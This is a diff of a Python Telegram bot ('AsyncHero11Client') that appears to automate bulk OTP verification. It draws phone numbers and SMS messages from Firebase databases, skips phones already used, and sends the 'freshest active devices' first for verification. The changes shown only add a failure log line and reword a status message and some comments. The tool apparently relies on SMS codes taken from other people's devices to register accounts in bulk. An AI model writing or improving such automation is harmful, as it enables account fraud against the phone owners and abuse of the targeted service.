@@ -378,6 +378,8 @@ class AsyncHero11Client:
             if user_info and user_info.get("isRestricted") is True:
                 return "IP_LIMITED"
             return "SUCCESS"
+        else:
+            print(f"[-] Verify Failed Response for {self.phone}: {result}")
         return "INVALID"
 
 # ==============================================================================
@@ -597,7 +599,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Ranking devices by recent OTP message pattern...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Ranking active devices by recency...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -635,7 +637,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         
-                                                        # GET RECENCY SCORE BASED ON TOP 10 MESSAGES
+                                                        # GET RECENCY SCORE
                                                         recency_score = get_latest_message_timestamp(msgs)
                                                         if recency_score > 0:
                                                             all_unregistered_candidates.append({
@@ -657,7 +659,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                     await asyncio.sleep(5)
                     continue
 
-                # SORT CANDIDATES BY RECENCY SCORE: Freshest active devices targeted FIRST
+                # SORT CANDIDATES BY RECENCY: Freshest active devices are targeted FIRST
                 all_unregistered_candidates.sort(key=lambda x: x["recency_score"], reverse=True)
 
                 target = all_unregistered_candidates[0]
